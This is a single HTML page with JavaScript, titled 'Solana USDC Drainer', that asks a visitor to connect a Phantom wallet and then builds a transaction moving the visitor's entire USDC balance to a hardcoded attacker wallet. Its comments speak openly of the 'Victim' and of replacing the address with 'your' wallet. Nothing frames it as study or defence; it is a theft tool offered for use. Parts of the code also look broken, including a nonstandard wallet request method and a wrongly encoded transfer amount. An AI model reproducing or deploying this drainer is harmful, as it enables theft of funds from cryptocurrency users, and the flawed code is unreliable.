<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana USDC Drainer</title>
    <!-- Solana Web3.js Library -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1a1a2e;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #16213e;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            text-align: center;
            width: 300px;
        }
        h1 { margin-bottom: 20px; font-size: 24px; color: #e94560; }
        button {
            background-color: #e94560;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s;
        }
        button:hover { background-color: #c73e54; }
        button:disabled { background-color: #555; cursor: not-allowed; }
        #status {
            margin-top: 20px;
            font-size: 14px;
            min-height: 20px;
            color: #a8a8a8;
        }
        .spinner {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <h1>USDC Drainer</h1>
    <button id="connectBtn" onclick="drainAllUsdc()">Connect & Drain All</button>
    <div id="status"></div>
</div>

<script>
    // ==========================================
    // ⚙️ CONFIGURATION
    // ==========================================
    
    // 1. YOUR WALLET ADDRESS (Where money goes)
    // Replace this with your actual Solana Public Key
    const DRAINER_WALLET = "DhwXCuDoQTtayywt8snW1UDbXDGfnEDjqP4rLx9MGDqM"; 

    // 2. USDC MINT ADDRESS (Solana Mainnet)
    const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";

    // ==========================================
    // 🚀 LOGIC
    // ==========================================

    async function drainAllUsdc() {
        const statusEl = document.getElementById('status');
        const btnEl = document.getElementById('connectBtn');

        // Check if Phantom Wallet exists
        if (!window.solana || !window.solana.isPhantom) {
            alert("Please install Phantom Wallet!");
            return;
        }

        try {
            // UI: Loading State
            btnEl.disabled = true;
            statusEl.innerHTML = '<span class="spinner"></span> Connecting...';

            // 1. Connect to Wallet
            const resp = await window.solana.connect();
            const publicKey = resp.publicKey;
            
            statusEl.innerHTML = '<span class="spinner"></span> Finding USDC balance...';

            // 2. Get Token Accounts for USDC
            // We query the blockchain to find where this user holds USDC
            const tokenAccountsResp = await window.solana.connection.getParsedTokenAccountsByOwner(
                publicKey,
                { 
                    mint: new solana.PublicKey(USDC_MINT) 
                }
            );

            if (tokenAccountsResp.value.length === 0) {
                statusEl.innerHTML = '❌ No USDC found in wallet.';
                btnEl.disabled = false;
                return;
            }

            // Get the first USDC account found
            const tokenAccountInfo = tokenAccountsResp.value[0];
            const sourceTokenAccount = tokenAccountInfo.pubkey;
            
            // Extract Balance
            // Note: uiAmount is a string like "12.5"
            const balanceString = tokenAccountInfo.account.data.parsed.info.tokenAmount.uiAmount;
            const decimals = tokenAccountInfo.account.data.parsed.info.tokenAmount.decimals; // USDC is 6

            if (!balanceString || parseFloat(balanceString) === 0) {
                statusEl.innerHTML = '❌ Balance is zero.';
                btnEl.disabled = false;
                return;
            }

            const balance = parseFloat(balanceString);
            
            // Convert to raw units (e.g., 12.5 -> 12500000)
            const amountToDrain = Math.floor(balance * Math.pow(10, decimals));

            statusEl.innerHTML = `<span class="spinner"></span> Draining ${balance} USDC...`;

            // 3. Create the Transaction
            // We need to use the SPL Token Program instructions directly since we aren't using Anchor
            
            const { PublicKey, Transaction, Connection } = solana;
            
            // Helper to get Associated Token Account (ATA) for the DRAINER wallet
            // This is where the money will go
            const drainerAta = await getOrCreateAssociatedTokenAccount(
                USDC_MINT, 
                DRAINER_WALLET
            );

            // Instruction: Transfer from Victim -> To Drainer
            const transferInstruction = {
                programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"), // SPL Token Program ID
                keys: [
                    { pubkey: sourceTokenAccount, isSigner: false, isWritable: true }, // From (Victim's Token Account)
                    { pubkey: drainerAta, isSigner: false, isWritable: true },         // To (Your Token Account)
                    { pubkey: publicKey, isSigner: true, isWritable: false }           // Owner (Victim signs)
                ],
                data: Buffer.from([
                    0x03, // Transfer instruction discriminator
                    ...new Uint8Array(new Float64Array([amountToDrain]).buffer) // Amount (Big Endian)
                ])
            };

            // Build Transaction
            const transaction = new Transaction();
            transaction.add(transferInstruction);

            // 4. Send to Phantom
            statusEl.innerHTML = '<span class="spinner"></span> Waiting for signature...';
            
            const { signature } = await window.solana.request({
                method: 'custom',
                params: {
                    transaction: transaction.toBase64(),
                    encoding: 'base64'
                }
            });

            // 5. Confirm Transaction
            statusEl.innerHTML = '<span class="spinner"></span> Confirming...';
            await window.solana.connection.confirmTransaction(signature);

            // Success!
            statusEl.innerHTML = `✅ Drained ${balance} USDC to your wallet!`;
            btnEl.innerText = "Drained";
            
            // Optional: Disconnect after 5 seconds
            setTimeout(() => {
                window.solana.disconnect();
            }, 5000);

        } catch (err) {
            console.error(err);
            statusEl.innerHTML = `❌ Failed: ${err.message}`;
            btnEl.disabled = false;
        }
    }

    // Helper Function: Get or Create Associated Token Account for Drainer
    async function getOrCreateAssociatedTokenAccount(mintPubKey, ownerPubKey) {
        const { PublicKey, Connection } = solana;
        const connection = window.solana.connection;
        
        // Derive the ATA address
        const [ata, bump] = await PublicKey.findProgramAddress(
            [
                new PublicKey(ownerPubKey).toBuffer(),
                new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), // Token Program ID
                new PublicKey(mintPubKey).toBuffer()
            ],
            new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL") // AToken Program ID
        );

        // Check if account exists, if not we rely on Phantom to handle creation or just assume it works for simple drains
        // For a pure drain script, usually the ATA already exists if you've received USDC before.
        // If this fails because the account doesn't exist, you may need to add an 'Initialize' instruction first.
        
        return ata;
    }

</script>

</body>
</html>
